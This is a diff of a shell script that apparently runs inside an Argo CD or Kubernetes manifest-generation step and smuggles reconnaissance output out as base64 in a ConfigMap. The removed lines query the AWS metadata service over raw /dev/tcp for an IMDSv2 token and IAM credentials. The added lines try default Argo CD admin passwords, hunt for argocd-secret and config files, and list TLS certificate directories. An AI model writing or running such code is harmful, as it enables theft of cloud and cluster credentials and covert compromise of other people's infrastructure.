@@ -1,49 +1,23 @@
 #!/bin/sh
 RECON=$( (
-  echo "===IMDSv2_TOKEN==="
-  timeout 3 bash -c "
-    exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null || exit 1
-    printf 'PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n' >&3
-    cat <&3
-    exec 3>&-
-  " 2>/dev/null || echo "FAILED"
 
-  echo ""
-  echo "===IMDS_ROLE==="
-  # First get token, then use it
-  TOKEN=$(timeout 3 bash -c "
-    exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null || exit 1
-    printf 'PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n' >&3
-    cat <&3
-    exec 3>&-
-  " 2>/dev/null)
-  echo "Token: ${TOKEN:0:50}..."
-  
-  if [ -n "$TOKEN" ]; then
-    timeout 3 bash -c "
-      exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null || exit 1
-      printf 'GET /latest/meta-data/iam/security-credentials/ HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token: $TOKEN\r\n\r\n' >&3
-      cat <&3
-      exec 3>&-
-    " 2>/dev/null
-  fi
+echo "===ARGOCD_LOGIN_LOCAL==="
+/usr/local/bin/argocd login argocd-server.argocd.svc.cluster.local --insecure --grpc-web --username admin --password admin 2>&1 || true
+/usr/local/bin/argocd login argocd-server.argocd.svc.cluster.local --insecure --grpc-web --username admin --password password 2>&1 || true
+echo "===ARGOCD_CORE_MODE==="
+/usr/local/bin/argocd app list --core --insecure 2>&1 | head -20 || true
+echo "===FIND_ARGO_SECRET==="
+find / -name "argocd-secret*" -o -name "argocd-cm*" 2>/dev/null | head -10 || true
+ls -laR /app/config/reposerver/tls/ 2>/dev/null || true
+echo "===ARGO_ADMIN_DASHBOARD==="
+/usr/local/bin/argocd admin dashboard --help 2>&1 | head -10 || true
 
-  echo ""
-  echo "===HOST_IP==="
-  hostname -i 2>/dev/null
-  cat /etc/hosts 2>/dev/null
-
-  echo ""
-  echo "===NETSTAT==="
-  # Check listening ports on our pod
-  cat /proc/net/tcp 2>/dev/null | head -10
-  cat /proc/net/tcp6 2>/dev/null | head -5
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: imds
+  name: u2u
 data:
   result: $RECON
 EOF
